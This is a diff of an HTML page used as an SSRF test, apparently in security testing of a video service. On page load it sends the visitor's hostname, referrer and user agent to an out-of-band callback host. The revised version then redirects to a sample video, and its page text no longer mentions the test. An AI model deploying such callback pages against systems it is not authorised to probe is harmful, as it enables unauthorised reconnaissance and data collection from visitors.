@@ -1,25 +1,32 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Mux SSRF Test</title>
+    <title>SSRF Logger & Redirect</title>
     <script>
-        // Function to send a "ping" to your Interactsh server
-        function logVisit() {
-            // Use fetch API to send a request to Interactsh
-            // We use fetch with 'no-cors' to avoid CORS issues, even though it's a simple GET
-            fetch('https://qqbatpnjqjnadljurlznc3gsxop1cg1wy.oast.fun/?log=visited&host=' + encodeURIComponent(window.location.hostname) + '&useragent=' + encodeURIComponent(navigator.userAgent) + '&path=' + encodeURIComponent(window.location.pathname), {
-                mode: 'no-cors' // This is key for making the request from any page
-            })
-            .then(() => console.log("Visit logged to Interactsh."))
-            .catch(err => console.error("Error logging visit:", err));
+        // Function to log the visit and then redirect
+        function logAndRedirect() {
+            // 1. First, log the visit to Interactsh
+            console.log("Logging visit to Interactsh...");
+            
+            // Use an Image object to make a GET request (works without CORS issues)
+            const img = new Image();
+            const logUrl = "https://qqbatpnjqjnadljurlznc3gsxop1cg1wy.oast.fun/?visited=" + 
+                          encodeURIComponent(window.location.hostname) + 
+                          "&referer=" + encodeURIComponent(document.referrer) +
+                          "&ua=" + encodeURIComponent(navigator.userAgent) +
+                          "&time=" + Date.now();
+            img.src = logUrl;
+            
+            // 2. Then, redirect to the actual video
+            console.log("Redirecting to Mux video...");
+            window.location.href = "https://static.mux.com/sample-videos/Product.mp4";
         }
-        // Run the function as soon as the page loads
-        window.onload = logVisit;
+        
+        // Run the function when the page loads
+        window.onload = logAndRedirect;
     </script>
 </head>
 <body>
-    <h1>SSRF Test Page</h1>
-    <p>This page is a test for SSRF. If the Mux server fetches this URL, it will trigger a request to my Interactsh server.</p>
-    <p>Check your Interactsh logs for a new HTTP request.</p>
+    <p>Logging this visit and redirecting to Mux video...</p>
 </body>
 </html>
